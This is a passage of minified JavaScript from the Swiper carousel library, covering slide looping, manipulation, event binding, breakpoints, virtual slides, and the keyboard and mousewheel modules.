t=this,e=a(),i=t.params,n=t.$wrapperEl;n.children("."+i.slideClass+"."+i.slideDuplicateClass).remove();var r=n.children("."+i.slideClass);if(i.loopFillGroupWithBlank){var o=i.slidesPerGroup-r.length%i.slidesPerGroup;if(o!==i.slidesPerGroup){for(var s=0;s<o;s+=1){var l=g(e.createElement("div")).addClass(i.slideClass+" "+i.slideBlankClass);n.append(l)}r=n.children("."+i.slideClass)}}"auto"!==i.slidesPerView||i.loopedSlides||(i.loopedSlides=r.length),t.loopedSlides=Math.ceil(parseFloat(i.loopedSlides||i.slidesPerView,10)),t.loopedSlides+=i.loopAdditionalSlides,t.loopedSlides>r.length&&(t.loopedSlides=r.length);var c=[],h=[];r.each((function(e,i){var n=g(e);i<t.loopedSlides&&h.push(e),i<r.length&&i>=r.length-t.loopedSlides&&c.push(e),n.attr("data-swiper-slide-index",i)}));for(var u=0;u<h.length;u+=1)n.append(g(h[u].cloneNode(!0)).addClass(i.slideDuplicateClass));for(var d=c.length-1;d>=0;d-=1)n.prepend(g(c[d].cloneNode(!0)).addClass(i.slideDuplicateClass))},loopFix:function(){this.emit("beforeLoopFix");var t,e=this.activeIndex,i=this.slides,n=this.loopedSlides,r=this.allowSlidePrev,a=this.allowSlideNext,o=this.snapGrid,s=this.rtlTranslate;this.allowSlidePrev=!0,this.allowSlideNext=!0;var l=-o[e]-this.getTranslate();e<n?(t=i.length-3*n+e,t+=n,this.slideTo(t,0,!1,!0)&&0!==l&&this.setTranslate((s?-this.translate:this.translate)-l)):e>=i.length-n&&(t=-i.length+e+n,t+=n,this.slideTo(t,0,!1,!0)&&0!==l&&this.setTranslate((s?-this.translate:this.translate)-l)),this.allowSlidePrev=r,this.allowSlideNext=a,this.emit("loopFix")},loopDestroy:function(){var t=this.$wrapperEl,e=this.params,i=this.slides;t.children("."+e.slideClass+"."+e.slideDuplicateClass+",."+e.slideClass+"."+e.slideBlankClass).remove(),i.removeAttr("data-swiper-slide-index")}},grabCursor:{setGrabCursor:function(t){if(!(this.support.touch||!this.params.simulateTouch||this.params.watchOverflow&&this.isLocked||this.params.cssMode)){var e=this.el;e.style.cursor="move",e.style.cursor=t?"-webkit-grabbing":"-webkit-grab",e.style.cursor=t?"-moz-grabbin":"-moz-grab",e.style.cursor=t?"grabbing":"grab"}},unsetGrabCursor:function(){this.support.touch||this.params.watchOverflow&&this.isLocked||this.params.cssMode||(this.el.style.cursor="")}},manipulation:{appendSlide:function(t){var e=this.$wrapperEl,i=this.params;if(i.loop&&this.loopDestroy(),"object"==typeof t&&"length"in t)for(var n=0;n<t.length;n+=1)t[n]&&e.append(t[n]);else e.append(t);i.loop&&this.loopCreate(),i.observer&&this.support.observer||this.update()},prependSlide:function(t){var e=this.params,i=this.$wrapperEl,n=this.activeIndex;e.loop&&this.loopDestroy();var r=n+1;if("object"==typeof t&&"length"in t){for(var a=0;a<t.length;a+=1)t[a]&&i.prepend(t[a]);r=n+t.length}else i.prepend(t);e.loop&&this.loopCreate(),e.observer&&this.support.observer||this.update(),this.slideTo(r,0,!1)},addSlide:function(t,e){var i=this.$wrapperEl,n=this.params,r=this.activeIndex;n.loop&&(r-=this.loopedSlides,this.loopDestroy(),this.slides=i.children("."+n.slideClass));var a=this.slides.length;if(t<=0)this.prependSlide(e);else if(t>=a)this.appendSlide(e);else{for(var o=r>t?r+1:r,s=[],l=a-1;l>=t;l-=1){var c=this.slides.eq(l);c.remove(),s.unshift(c)}if("object"==typeof e&&"length"in e){for(var h=0;h<e.length;h+=1)e[h]&&i.append(e[h]);o=r>t?r+e.length:r}else i.append(e);for(var u=0;u<s.length;u+=1)i.append(s[u]);n.loop&&this.loopCreate(),n.observer&&this.support.observer||this.update(),n.loop?this.slideTo(o+this.loopedSlides,0,!1):this.slideTo(o,0,!1)}},removeSlide:function(t){var e=this.params,i=this.$wrapperEl,n=this.activeIndex;e.loop&&(n-=this.loopedSlides,this.loopDestroy(),this.slides=i.children("."+e.slideClass));var r,a=n;if("object"==typeof t&&"length"in t){for(var o=0;o<t.length;o+=1)r=t[o],this.slides[r]&&this.slides.eq(r).remove(),r<a&&(a-=1);a=Math.max(a,0)}else r=t,this.slides[r]&&this.slides.eq(r).remove(),r<a&&(a-=1),a=Math.max(a,0);e.loop&&this.loopCreate(),e.observer&&this.support.observer||this.update(),e.loop?this.slideTo(a+this.loopedSlides,0,!1):this.slideTo(a,0,!1)},removeAllSlides:function(){for(var t=[],e=0;e<this.slides.length;e+=1)t.push(e);this.removeSlide(t)}},events:{attachEvents:function(){var t=a(),e=this.params,i=this.touchEvents,n=this.el,r=this.wrapperEl,o=this.device,s=this.support;this.onTouchStart=I.bind(this),this.onTouchMove=z.bind(this),this.onTouchEnd=D.bind(this),e.cssMode&&(this.onScroll=B.bind(this)),this.onClick=k.bind(this);var l=!!e.nested;if(!s.touch&&s.pointerEvents)n.addEventListener(i.start,this.onTouchStart,!1),t.addEventListener(i.move,this.onTouchMove,l),t.addEventListener(i.end,this.onTouchEnd,!1);else{if(s.touch){var c=!("touchstart"!==i.start||!s.passiveListener||!e.passiveListeners)&&{passive:!0,capture:!1};n.addEventListener(i.start,this.onTouchStart,c),n.addEventListener(i.move,this.onTouchMove,s.passiveListener?{passive:!1,capture:l}:l),n.addEventListener(i.end,this.onTouchEnd,c),i.cancel&&n.addEventListener(i.cancel,this.onTouchEnd,c),F||(t.addEventListener("touchstart",H),F=!0)}(e.simulateTouch&&!o.ios&&!o.android||e.simulateTouch&&!s.touch&&o.ios)&&(n.addEventListener("mousedown",this.onTouchStart,!1),t.addEventListener("mousemove",this.onTouchMove,l),t.addEventListener("mouseup",this.onTouchEnd,!1))}(e.preventClicks||e.preventClicksPropagation)&&n.addEventListener("click",this.onClick,!0),e.cssMode&&r.addEventListener("scroll",this.onScroll),e.updateOnWindowResize?this.on(o.ios||o.android?"resize orientationchange observerUpdate":"resize observerUpdate",N,!0):this.on("observerUpdate",N,!0)},detachEvents:function(){var t=a(),e=this.params,i=this.touchEvents,n=this.el,r=this.wrapperEl,o=this.device,s=this.support,l=!!e.nested;if(!s.touch&&s.pointerEvents)n.removeEventListener(i.start,this.onTouchStart,!1),t.removeEventListener(i.move,this.onTouchMove,l),t.removeEventListener(i.end,this.onTouchEnd,!1);else{if(s.touch){var c=!("onTouchStart"!==i.start||!s.passiveListener||!e.passiveListeners)&&{passive:!0,capture:!1};n.removeEventListener(i.start,this.onTouchStart,c),n.removeEventListener(i.move,this.onTouchMove,l),n.removeEventListener(i.end,this.onTouchEnd,c),i.cancel&&n.removeEventListener(i.cancel,this.onTouchEnd,c)}(e.simulateTouch&&!o.ios&&!o.android||e.simulateTouch&&!s.touch&&o.ios)&&(n.removeEventListener("mousedown",this.onTouchStart,!1),t.removeEventListener("mousemove",this.onTouchMove,l),t.removeEventListener("mouseup",this.onTouchEnd,!1))}(e.preventClicks||e.preventClicksPropagation)&&n.removeEventListener("click",this.onClick,!0),e.cssMode&&r.removeEventListener("scroll",this.onScroll),this.off(o.ios||o.android?"resize orientationchange observerUpdate":"resize observerUpdate",N)}},breakpoints:{setBreakpoint:function(){var t=this.activeIndex,e=this.initialized,i=this.loopedSlides,n=void 0===i?0:i,r=this.params,a=this.$el,o=r.breakpoints;if(o&&(!o||0!==Object.keys(o).length)){var s=this.getBreakpoint(o);if(s&&this.currentBreakpoint!==s){var l=s in o?o[s]:void 0;l&&["slidesPerView","spaceBetween","slidesPerGroup","slidesPerGroupSkip","slidesPerColumn"].forEach((function(t){var e=l[t];void 0!==e&&(l[t]="slidesPerView"!==t||"AUTO"!==e&&"auto"!==e?"slidesPerView"===t?parseFloat(e):parseInt(e,10):"auto")}));var c=l||this.originalParams,h=r.slidesPerColumn>1,u=c.slidesPerColumn>1;h&&!u?(a.removeClass(r.containerModifierClass+"multirow "+r.containerModifierClass+"multirow-column"),this.emitContainerClasses()):!h&&u&&(a.addClass(r.containerModifierClass+"multirow"),"column"===c.slidesPerColumnFill&&a.addClass(r.containerModifierClass+"multirow-column"),this.emitContainerClasses());var d=c.direction&&c.direction!==r.direction,p=r.loop&&(c.slidesPerView!==r.slidesPerView||d);d&&e&&this.changeDirection(),T(this.params,c),T(this,{allowTouchMove:this.params.allowTouchMove,allowSlideNext:this.params.allowSlideNext,allowSlidePrev:this.params.allowSlidePrev}),this.currentBreakpoint=s,this.emit("_beforeBreakpoint",c),p&&e&&(this.loopDestroy(),this.loopCreate(),this.updateSlides(),this.slideTo(t-n+this.loopedSlides,0,!1)),this.emit("breakpoint",c)}}},getBreakpoint:function(t){var e=s();if(t){var i=!1,n=Object.keys(t).map((function(t){if("string"==typeof t&&0===t.indexOf("@")){var i=parseFloat(t.substr(1));return{value:e.innerHeight*i,point:t}}return{value:t,point:t}}));n.sort((function(t,e){return parseInt(t.value,10)-parseInt(e.value,10)}));for(var r=0;r<n.length;r+=1){var a=n[r],o=a.point;a.value<=e.innerWidth&&(i=o)}return i||"max"}}},checkOverflow:{checkOverflow:function(){var t=this.params,e=this.isLocked,i=this.slides.length>0&&t.slidesOffsetBefore+t.spaceBetween*(this.slides.length-1)+this.slides[0].offsetWidth*this.slides.length;t.slidesOffsetBefore&&t.slidesOffsetAfter&&i?this.isLocked=i<=this.size:this.isLocked=1===this.snapGrid.length,this.allowSlideNext=!this.isLocked,this.allowSlidePrev=!this.isLocked,e!==this.isLocked&&this.emit(this.isLocked?"lock":"unlock"),e&&e!==this.isLocked&&(this.isEnd=!1,this.navigation&&this.navigation.update())}},classes:{addClasses:function(){var t=this.classNames,e=this.params,i=this.rtl,n=this.$el,r=this.device,a=[];a.push("initialized"),a.push(e.direction),e.freeMode&&a.push("free-mode"),e.autoHeight&&a.push("autoheight"),i&&a.push("rtl"),e.slidesPerColumn>1&&(a.push("multirow"),"column"===e.slidesPerColumnFill&&a.push("multirow-column")),r.android&&a.push("android"),r.ios&&a.push("ios"),e.cssMode&&a.push("css-mode"),a.forEach((function(i){t.push(e.containerModifierClass+i)})),n.addClass(t.join(" ")),this.emitContainerClasses()},removeClasses:function(){var t=this.$el,e=this.classNames;t.removeClass(e.join(" ")),this.emitContainerClasses()}},images:{loadImage:function(t,e,i,n,r,a){var o,l=s();function c(){a&&a()}g(t).parent("picture")[0]||t.complete&&r?c():e?((o=new l.Image).onload=c,o.onerror=c,n&&(o.sizes=n),i&&(o.srcset=i),e&&(o.src=e)):c()},preloadImages:function(){var t=this;function e(){null!=t&&t&&!t.destroyed&&(void 0!==t.imagesLoaded&&(t.imagesLoaded+=1),t.imagesLoaded===t.imagesToLoad.length&&(t.params.updateOnImagesReady&&t.update(),t.emit("imagesReady")))}t.imagesToLoad=t.$el.find("img");for(var i=0;i<t.imagesToLoad.length;i+=1){var n=t.imagesToLoad[i];t.loadImage(n,n.currentSrc||n.getAttribute("src"),n.srcset||n.getAttribute("srcset"),n.sizes||n.getAttribute("sizes"),!0,e)}}}},U={},V=function(){function e(){for(var t,i,n=arguments.length,r=new Array(n),a=0;a<n;a++)r[a]=arguments[a];1===r.length&&r[0].constructor&&r[0].constructor===Object?i=r[0]:(t=r[0],i=r[1]),i||(i={}),i=T({},i),t&&!i.el&&(i.el=t);var o=this;o.support=C(),o.device=A({userAgent:i.userAgent}),o.browser=L(),o.eventsListeners={},o.eventsAnyListeners=[],void 0===o.modules&&(o.modules={}),Object.keys(o.modules).forEach((function(t){var e=o.modules[t];if(e.params){var n=Object.keys(e.params)[0],r=e.params[n];if("object"!=typeof r||null===r)return;if(!(n in i)||!("enabled"in r))return;!0===i[n]&&(i[n]={enabled:!0}),"object"!=typeof i[n]||"enabled"in i[n]||(i[n].enabled=!0),i[n]||(i[n]={enabled:!1})}}));var s=T({},G);o.useParams(s),o.params=T({},s,U,i),o.originalParams=T({},o.params),o.passedParams=T({},i),o.params&&o.params.on&&Object.keys(o.params.on).forEach((function(t){o.on(t,o.params.on[t])})),o.params&&o.params.onAny&&o.onAny(o.params.onAny),o.$=g;var l=g(o.params.el);if(t=l[0]){if(l.length>1){var c=[];return l.each((function(t){var n=T({},i,{el:t});c.push(new e(n))})),c}var h,u,d;return t.swiper=o,t&&t.shadowRoot&&t.shadowRoot.querySelector?(h=g(t.shadowRoot.querySelector("."+o.params.wrapperClass))).children=function(t){return l.children(t)}:h=l.children("."+o.params.wrapperClass),T(o,{$el:l,el:t,$wrapperEl:h,wrapperEl:h[0],classNames:[],slides:g(),slidesGrid:[],snapGrid:[],slidesSizesGrid:[],isHorizontal:function(){return"horizontal"===o.params.direction},isVertical:function(){return"vertical"===o.params.direction},rtl:"rtl"===t.dir.toLowerCase()||"rtl"===l.css("direction"),rtlTranslate:"horizontal"===o.params.direction&&("rtl"===t.dir.toLowerCase()||"rtl"===l.css("direction")),wrongRTL:"-webkit-box"===h.css("display"),activeIndex:0,realIndex:0,isBeginning:!0,isEnd:!1,translate:0,previousTranslate:0,progress:0,velocity:0,animating:!1,allowSlideNext:o.params.allowSlideNext,allowSlidePrev:o.params.allowSlidePrev,touchEvents:(u=["touchstart","touchmove","touchend","touchcancel"],d=["mousedown","mousemove","mouseup"],o.support.pointerEvents&&(d=["pointerdown","pointermove","pointerup"]),o.touchEventsTouch={start:u[0],move:u[1],end:u[2],cancel:u[3]},o.touchEventsDesktop={start:d[0],move:d[1],end:d[2]},o.support.touch||!o.params.simulateTouch?o.touchEventsTouch:o.touchEventsDesktop),touchEventsData:{isTouched:void 0,isMoved:void 0,allowTouchCallbacks:void 0,touchStartTime:void 0,isScrolling:void 0,currentTranslate:void 0,startTranslate:void 0,allowThresholdMove:void 0,formElements:"input, select, option, textarea, button, video, label",lastClickTime:_(),clickTimeout:void 0,velocities:[],allowMomentumBounce:void 0,isTouchEvent:void 0,startMoving:void 0},allowClick:!0,allowTouchMove:o.params.allowTouchMove,touches:{startX:0,startY:0,currentX:0,currentY:0,diff:0},imagesToLoad:[],imagesLoaded:0}),o.useModules(),o.emit("_swiper"),o.params.init&&o.init(),o}}var i,n,r=e.prototype;return r.emitContainerClasses=function(){var t=this;if(t.params._emitClasses&&t.el){var e=t.el.className.split(" ").filter((function(e){return 0===e.indexOf("swiper-container")||0===e.indexOf(t.params.containerModifierClass)}));t.emit("_containerClasses",e.join(" "))}},r.getSlideClasses=function(t){var e=this;return t.className.split(" ").filter((function(t){return 0===t.indexOf("swiper-slide")||0===t.indexOf(e.params.slideClass)})).join(" ")},r.emitSlidesClasses=function(){var t=this;t.params._emitClasses&&t.el&&t.slides.each((function(e){var i=t.getSlideClasses(e);t.emit("_slideClass",e,i)}))},r.slidesPerViewDynamic=function(){var t=this.params,e=this.slides,i=this.slidesGrid,n=this.size,r=this.activeIndex,a=1;if(t.centeredSlides){for(var o,s=e[r].swiperSlideSize,l=r+1;l<e.length;l+=1)e[l]&&!o&&(a+=1,(s+=e[l].swiperSlideSize)>n&&(o=!0));for(var c=r-1;c>=0;c-=1)e[c]&&!o&&(a+=1,(s+=e[c].swiperSlideSize)>n&&(o=!0))}else for(var h=r+1;h<e.length;h+=1)i[h]-i[r]<n&&(a+=1);return a},r.update=function(){var t=this;if(t&&!t.destroyed){var e=t.snapGrid,i=t.params;i.breakpoints&&t.setBreakpoint(),t.updateSize(),t.updateSlides(),t.updateProgress(),t.updateSlidesClasses(),t.params.freeMode?(n(),t.params.autoHeight&&t.updateAutoHeight()):(("auto"===t.params.slidesPerView||t.params.slidesPerView>1)&&t.isEnd&&!t.params.centeredSlides?t.slideTo(t.slides.length-1,0,!1,!0):t.slideTo(t.activeIndex,0,!1,!0))||n(),i.watchOverflow&&e!==t.snapGrid&&t.checkOverflow(),t.emit("update")}function n(){var e=t.rtlTranslate?-1*t.translate:t.translate,i=Math.min(Math.max(e,t.maxTranslate()),t.minTranslate());t.setTranslate(i),t.updateActiveIndex(),t.updateSlidesClasses()}},r.changeDirection=function(t,e){void 0===e&&(e=!0);var i=this.params.direction;return t||(t="horizontal"===i?"vertical":"horizontal"),t===i||"horizontal"!==t&&"vertical"!==t||(this.$el.removeClass(""+this.params.containerModifierClass+i).addClass(""+this.params.containerModifierClass+t),this.emitContainerClasses(),this.params.direction=t,this.slides.each((function(e){"vertical"===t?e.style.width="":e.style.height=""})),this.emit("changeDirection"),e&&this.update()),this},r.init=function(){this.initialized||(this.emit("beforeInit"),this.params.breakpoints&&this.setBreakpoint(),this.addClasses(),this.params.loop&&this.loopCreate(),this.updateSize(),this.updateSlides(),this.params.watchOverflow&&this.checkOverflow(),this.params.grabCursor&&this.setGrabCursor(),this.params.preloadImages&&this.preloadImages(),this.params.loop?this.slideTo(this.params.initialSlide+this.loopedSlides,0,this.params.runCallbacksOnInit):this.slideTo(this.params.initialSlide,0,this.params.runCallbacksOnInit),this.attachEvents(),this.initialized=!0,this.emit("init"),this.emit("afterInit"))},r.destroy=function(t,e){void 0===t&&(t=!0),void 0===e&&(e=!0);var i,n=this,r=n.params,a=n.$el,o=n.$wrapperEl,s=n.slides;return void 0===n.params||n.destroyed||(n.emit("beforeDestroy"),n.initialized=!1,n.detachEvents(),r.loop&&n.loopDestroy(),e&&(n.removeClasses(),a.removeAttr("style"),o.removeAttr("style"),s&&s.length&&s.removeClass([r.slideVisibleClass,r.slideActiveClass,r.slideNextClass,r.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index")),n.emit("destroy"),Object.keys(n.eventsListeners).forEach((function(t){n.off(t)})),!1!==t&&(n.$el[0].swiper=null,i=n,Object.keys(i).forEach((function(t){try{i[t]=null}catch(t){}try{delete i[t]}catch(t){}}))),n.destroyed=!0),null},e.extendDefaults=function(t){T(U,t)},e.installModule=function(t){e.prototype.modules||(e.prototype.modules={});var i=t.name||Object.keys(e.prototype.modules).length+"_"+_();e.prototype.modules[i]=t},e.use=function(t){return Array.isArray(t)?(t.forEach((function(t){return e.installModule(t)})),e):(e.installModule(t),e)},i=e,n=[{key:"extendedDefaults",get:function(){return U}},{key:"defaults",get:function(){return G}}],null&&t(i.prototype,null),n&&t(i,n),e}();Object.keys(j).forEach((function(t){Object.keys(j[t]).forEach((function(e){V.prototype[e]=j[t][e]}))})),V.use([P,O]);var W={update:function(t){var e=this,i=e.params,n=i.slidesPerView,r=i.slidesPerGroup,a=i.centeredSlides,o=e.params.virtual,s=o.addSlidesBefore,l=o.addSlidesAfter,c=e.virtual,h=c.from,u=c.to,d=c.slides,p=c.slidesGrid,f=c.renderSlide,m=c.offset;e.updateActiveIndex();var g,v,y,x=e.activeIndex||0;g=e.rtlTranslate?"right":e.isHorizontal()?"left":"top",a?(v=Math.floor(n/2)+r+l,y=Math.floor(n/2)+r+s):(v=n+(r-1)+l,y=r+s);var b=Math.max((x||0)-y,0),w=Math.min((x||0)+v,d.length-1),_=(e.slidesGrid[b]||0)-(e.slidesGrid[0]||0);function M(){e.updateSlides(),e.updateProgress(),e.updateSlidesClasses(),e.lazy&&e.params.lazy.enabled&&e.lazy.load()}if(T(e.virtual,{from:b,to:w,offset:_,slidesGrid:e.slidesGrid}),h===b&&u===w&&!t)return e.slidesGrid!==p&&_!==m&&e.slides.css(g,_+"px"),void e.updateProgress();if(e.params.virtual.renderExternal)return e.params.virtual.renderExternal.call(e,{offset:_,from:b,to:w,slides:function(){for(var t=[],e=b;e<=w;e+=1)t.push(d[e]);return t}()}),void(e.params.virtual.renderExternalUpdate&&M());var S=[],E=[];if(t)e.$wrapperEl.find("."+e.params.slideClass).remove();else for(var C=h;C<=u;C+=1)(C<b||C>w)&&e.$wrapperEl.find("."+e.params.slideClass+'[data-swiper-slide-index="'+C+'"]').remove();for(var A=0;A<d.length;A+=1)A>=b&&A<=w&&(void 0===u||t?E.push(A):(A>u&&E.push(A),A<h&&S.push(A)));E.forEach((function(t){e.$wrapperEl.append(f(d[t],t))})),S.sort((function(t,e){return e-t})).forEach((function(t){e.$wrapperEl.prepend(f(d[t],t))})),e.$wrapperEl.children(".swiper-slide").css(g,_+"px"),M()},renderSlide:function(t,e){var i=this.params.virtual;if(i.cache&&this.virtual.cache[e])return this.virtual.cache[e];var n=i.renderSlide?g(i.renderSlide.call(this,t,e)):g('<div class="'+this.params.slideClass+'" data-swiper-slide-index="'+e+'">'+t+"</div>");return n.attr("data-swiper-slide-index")||n.attr("data-swiper-slide-index",e),i.cache&&(this.virtual.cache[e]=n),n},appendSlide:function(t){if("object"==typeof t&&"length"in t)for(var e=0;e<t.length;e+=1)t[e]&&this.virtual.slides.push(t[e]);else this.virtual.slides.push(t);this.virtual.update(!0)},prependSlide:function(t){var e=this.activeIndex,i=e+1,n=1;if(Array.isArray(t)){for(var r=0;r<t.length;r+=1)t[r]&&this.virtual.slides.unshift(t[r]);i=e+t.length,n=t.length}else this.virtual.slides.unshift(t);if(this.params.virtual.cache){var a=this.virtual.cache,o={};Object.keys(a).forEach((function(t){var e=a[t],i=e.attr("data-swiper-slide-index");i&&e.attr("data-swiper-slide-index",parseInt(i,10)+1),o[parseInt(t,10)+n]=e})),this.virtual.cache=o}this.virtual.update(!0),this.slideTo(i,0)},removeSlide:function(t){if(null!=t){var e=this.activeIndex;if(Array.isArray(t))for(var i=t.length-1;i>=0;i-=1)this.virtual.slides.splice(t[i],1),this.params.virtual.cache&&delete this.virtual.cache[t[i]],t[i]<e&&(e-=1),e=Math.max(e,0);else this.virtual.slides.splice(t,1),this.params.virtual.cache&&delete this.virtual.cache[t],t<e&&(e-=1),e=Math.max(e,0);this.virtual.update(!0),this.slideTo(e,0)}},removeAllSlides:function(){this.virtual.slides=[],this.params.virtual.cache&&(this.virtual.cache={}),this.virtual.update(!0),this.slideTo(0,0)}},q={name:"virtual",params:{virtual:{enabled:!1,slides:[],cache:!0,renderSlide:null,renderExternal:null,renderExternalUpdate:!0,addSlidesBefore:0,addSlidesAfter:0}},create:function(){E(this,{virtual:e(e({},W),{},{slides:this.params.virtual.slides,cache:{}})})},on:{beforeInit:function(t){if(t.params.virtual.enabled){t.classNames.push(t.params.containerModifierClass+"virtual");var e={watchSlidesProgress:!0};T(t.params,e),T(t.originalParams,e),t.params.initialSlide||t.virtual.update()}},setTranslate:function(t){t.params.virtual.enabled&&t.virtual.update()}}},X={handle:function(t){var e=s(),i=a(),n=this.rtlTranslate,r=t;r.originalEvent&&(r=r.originalEvent);var o=r.keyCode||r.charCode,l=this.params.keyboard.pageUpDown,c=l&&33===o,h=l&&34===o,u=37===o,d=39===o,p=38===o,f=40===o;if(!this.allowSlideNext&&(this.isHorizontal()&&d||this.isVertical()&&f||h))return!1;if(!this.allowSlidePrev&&(this.isHorizontal()&&u||this.isVertical()&&p||c))return!1;if(!(r.shiftKey||r.altKey||r.ctrlKey||r.metaKey||i.activeElement&&i.activeElement.nodeName&&("input"===i.activeElement.nodeName.toLowerCase()||"textarea"===i.activeElement.nodeName.toLowerCase()))){if(this.params.keyboard.onlyInViewport&&(c||h||u||d||p||f)){var m=!1;if(this.$el.parents("."+this.params.slideClass).length>0&&0===this.$el.parents("."+this.params.slideActiveClass).length)return;var g=e.innerWidth,v=e.innerHeight,y=this.$el.offset();n&&(y.left-=this.$el[0].scrollLeft);for(var x=[[y.left,y.top],[y.left+this.width,y.top],[y.left,y.top+this.height],[y.left+this.width,y.top+this.height]],b=0;b<x.length;b+=1){var w=x[b];w[0]>=0&&w[0]<=g&&w[1]>=0&&w[1]<=v&&(m=!0)}if(!m)return}this.isHorizontal()?((c||h||u||d)&&(r.preventDefault?r.preventDefault():r.returnValue=!1),((h||d)&&!n||(c||u)&&n)&&this.slideNext(),((c||u)&&!n||(h||d)&&n)&&this.slidePrev()):((c||h||p||f)&&(r.preventDefault?r.preventDefault():r.returnValue=!1),(h||f)&&this.slideNext(),(c||p)&&this.slidePrev()),this.emit("keyPress",o)}},enable:function(){var t=a();this.keyboard.enabled||(g(t).on("keydown",this.keyboard.handle),this.keyboard.enabled=!0)},disable:function(){var t=a();this.keyboard.enabled&&(g(t).off("keydown",this.keyboard.handle),this.keyboard.enabled=!1)}},Y={name:"keyboard",params:{keyboard:{enabled:!1,onlyInViewport:!0,pageUpDown:!0}},create:function(){E(this,{keyboard:e({enabled:!1},X)})},on:{init:function(t){t.params.keyboard.enabled&&t.keyboard.enable()},destroy:function(t){t.keyboard.enabled&&t.keyboard.disable()}}},$={lastScrollTime:_(),lastEventBeforeSnap:void 0,recentWheelEvents:[],event:function(){return s().navigator.userAgent.indexOf("firefox")>-1?"DOMMouseScroll":function(){var t=a(),e="onwheel"in t;if(!e){var i=t.createElement("div");i.setAttribute("onwheel","return;"),e="function"==typeof i.onwheel}return!e&&t.implementation&&t.implementation.hasFeature&&!0!==t.implementation.hasFeature("","")&&(e=t.implementation.hasFeature("Events.wheel","3.0")),e}()?"wheel":"mousewheel"},normalize:function(t){var e=0,i=0,n=0,r=0;return"detail"in t&&(i=t.detail),"wheelDelta"in t&&(i=-t.wheelDelta/120),"wheelDeltaY"in t&&(i=-t.wheelDeltaY/120),"wheelDeltaX"in t&&(e=-t.wheelDeltaX/120),"axis"in t&&t.axis===t.HORIZONTAL_AXIS&&(e=i,i=0),n=10*e,r=10*i,"deltaY"in t&&(r=t.deltaY),"deltaX"in t&&(n=t.deltaX),t.shiftKey&&!n&&(n=r,r=0),(n||r)&&t.deltaMode&&(1===t.deltaMode?(n*=40,r*=40):(n*=800,r*=800)),n&&!e&&(e=n<1?-1:1),r&&!i&&(i=r<1?-1:1),{spinX:e,spinY:i,pixelX:n,pixelY:r}},handleMouseEnter:function(){this.mouseEntered=!0},handleMouseLeave:function(){this.mouseEntered=!1},handle:function(t){var e=t,i=this,n=i.params.mousewheel;i.params.cssMode&&e.preventDefault();var r=i.$el;if("container"!==i.params.mousewheel.eventsTarget&&(r=g(i.params.mousewheel.eventsTarget)),!i.mouseEntered&&!r[0].contains(e.target)&&!n.releaseOnEdges)return!0;e.originalEvent&&(e=e.originalEvent);var a=0,o=i.rtlTranslate?-1:1,s=$.normalize(e);if(n.forceToAxis)if(i.isHorizontal()){if(!(Math.abs(s.pixelX)>Math.abs(s.pixelY)))return!0;a=-s.pixelX*o}else{if(!(Math.abs(s.pixelY)>Math.abs(s.pixelX)))return!0;a=-s.pixelY}else a=Math.abs(s.pixelX)>Math.abs(s.pixelY)?-s.pixelX*o:-s.pixelY;if(0===a)return!0;if(n.invert&&(a=-a),i.params.freeMode){var l={time:_(),delta:Math.abs(a),direction:Math.sign(a)},c=i.mousewheel.lastEventBeforeSnap,h=c&&l.time<c.time+500&&l.delta<=c.delta&&l.direction===c.direction;if(!h){i.mousewheel.lastEventBeforeSnap=void 0,i.params.loop&&i.loopFix();var u=i.getTranslate()+a*n.sensitivity,d=i.isBeginning,p=i.isEnd;if(u>=i.minTranslate()&&(u=i.minTranslate()),u<=i.maxTranslate()&&(u=i.maxTranslate()),i.setTransition(0),i.setTranslate(u),i.updateProgress(),i.updateActiveIndex(),i.updateSlidesClasses(),(!d&&i.isBeginning||!p&&i.isEnd)&&i.updateSlidesClasses(),i.params.freeModeSticky){clearTimeout(i.mousewheel.timeout),i.mousewheel.timeout=void 0;var f=i.mousewheel.recentWheelEvents;f.length>=15&&f.shift();var m=f.length?f[f.length-1]:void 0,v=f[0];if(f.push(l),m&&(l.delta>m.delta||l.direction!==m.direction))f.splice(0);else if(f.length>=15&&l.time-v.time<500&&v.delta-l.delta>=1&&l.delta<=6){var y=a>0?.8:.2;i.mousewheel.lastEventBeforeSnap=l,f.splice(0),i.mousewheel.timeout=w((function(){i.slideToClosest(i.params.speed,!0,void 0,y)}),0)}i.mousewheel.timeout||(i.mousewheel.timeout=w((function(){i.mousewheel.lastEventBeforeSnap=l,f.splice(0),i.slideToClosest(i.params.speed,!0,void 0,.5)}),500))}if(h||i.emit("scroll",e),i.params.autoplay&&i.params.autoplayDisableOnInteraction&&i.autoplay.stop(),u===i.minTranslate()||u===i.maxTranslate())return!0}}else{var x={time:_(),delta:Math.abs(a),direction:Math.sign(a),raw:t},b=i.mousewheel.recentWheelEvents;b.length>=2&&b.shift();var M=b.length?b[b.length-1]:void 0;if(b.push(x),M?(x.direction!==M.direction||x.delta>M.delta||x.time>M.time+150)&&i.mousewheel.animateSlider(x):i.mousewheel.animateSlider(x),i.mousewheel.releaseScroll(x))return!0}return e.preventDefault?e.preventDefault():e.returnValue=!1,!1},animateSlider:function(t){var e=s();return!(this.params.mousewheel.thresholdDelta&&t.delta<this.params.mousewheel.thresholdDelta||this.params.mousewheel.thresholdTime&&_()-this.mousewheel.lastScrollTime<this.params.mousewheel.thresholdTime||!(t.delta>=6&&_()-this.mousewheel.lastScrollTime<60)&&(t.direction<0?this.isEnd&&!this.params.loop||this.animating||(this.slideNext(),this.emit("scroll",t.raw)):this.isBeginning&&!this.params.loop||this.animating||(this.slidePrev(),this.emit("scroll",t.raw)),this.mousewheel.lastScrollTime=(new e.Date).getTime(),1))},releaseScroll:function(t){var e=this.params.mousewheel;if(t.direction<0){if(this.isEnd&&!this.params.loop&&e.releaseOnEdges)return!0}else if(this.isBeginning&&!this.params.loop&&e.releaseOnEdges)return!0;return!1},enable:function(){var t=$.event();if(this.params.cssMode)return this.wrapperEl.removeEventListener(t,this.mousewheel.handle),!0;if(!t)return!1;if(this.mousewheel.enabled)return!1;var e=this.$el;return"container"!==this.params.mousewheel.eventsTarget&&(e=g(this.params.mousewheel.eventsTarget)),e.on("mouseenter",this.mousewheel.handleMouseEnter),e.on("mouseleave",this.mousewheel.handleMouseLeave),e.on(t,this.mousewheel.handle),this.mousewheel.enabled=!0,!0},disable:function(){var t=$.event();if(this.params.cssMode)return this.wrapperEl.addEventListener(t,this.mousewheel.handle),!0;if(!t)return!1;if(!this.mousewheel.enabled)return!1;var 